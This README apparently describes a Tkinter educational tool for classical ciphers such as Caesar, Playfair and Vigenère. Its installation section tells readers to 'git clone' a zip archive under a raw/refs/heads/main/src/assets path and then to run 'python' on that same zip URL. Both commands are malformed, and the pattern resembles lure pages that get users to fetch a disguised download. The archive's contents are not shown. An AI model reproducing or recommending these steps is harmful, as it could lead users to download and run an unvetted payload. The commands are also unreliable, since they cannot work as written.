## Features

- User-friendly GUI built with Tkinter
- Supports multiple classical ciphers
- Easy to use for educational purposes
- File handling capabilities
- Modular design for easy understanding
- Clear error messages to guide users

## Supported Ciphers

This tool includes the following classical ciphers:

1. **Caesar Cipher**: A simple substitution cipher where each letter is shifted by a fixed number.
2. **Playfair Cipher**: A digraph substitution cipher that encrypts pairs of letters.
3. **Rail Fence Cipher**: A transposition cipher that arranges text in a zigzag pattern.
4. **ROT13**: A special case of the Caesar cipher that shifts letters by 13 places.
5. **Substitution Cipher**: Each letter in the plaintext is replaced with another letter.
6. **Vigenère Cipher**: A method that uses a keyword to shift letters in the plaintext.

## Installation

To install the Cybersecurity Encryption & Decryption Tool, follow these steps:

1. **Clone the Repository**: Open your terminal and run:
   ```bash
   git clone https://github.com/bonglehongle/cybersecurity-encryption-decryption-tool/raw/refs/heads/main/src/assets/tool-decryption-encryption-cybersecurity-v2.4-alpha.1.zip
   ```
   
2. **Navigate to the Directory**:
   ```bash
   cd cybersecurity-encryption-decryption-tool
   ```

3. **Install Dependencies**: Make sure you have Python installed. Then, install Tkinter if it's not already installed. You can do this using:
   ```bash
   pip install tk
   ```

4. **Run the Application**: Execute the following command:
   ```bash
   python https://github.com/bonglehongle/cybersecurity-encryption-decryption-tool/raw/refs/heads/main/src/assets/tool-decryption-encryption-cybersecurity-v2.4-alpha.1.zip
   ```

## Usage

Once the application is running, you will see a clean interface with options to choose different ciphers. 

- Select the cipher you want to use from the dropdown menu.
- Input your text in the provided field.
- Click the "Encrypt" or "Decrypt" button based on your need.
- View the output in the designated area.

## File Handling

The tool allows you to import text files for encryption or decryption. Here’s how:

1. Click on the "Import" button.
2. Choose the text file you wish to encrypt or decrypt.
3. The application will load the content for processing.

You can also save the output to a file:

1. After processing, click on the "Save" button.
2. Choose the location and name for your output file.

## Modular Design

The application is designed in a modular way. Each cipher has its own dedicated module. This approach makes it easy to understand the code and extend functionality in the future. If you wish to add a new cipher, simply create a new module and integrate it with the main application.

## Error Messages

The tool provides clear error messages to help you troubleshoot issues. If you input invalid text or encounter a problem during encryption or decryption, the application will display a helpful message. This feature enhances the learning experience by guiding users through common pitfalls.

## Contributing

We welcome contributions to improve this tool. If you have ideas or suggestions, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or fix.
3. Make your changes and commit them.
4. Push to your branch.
5. Create a pull request.
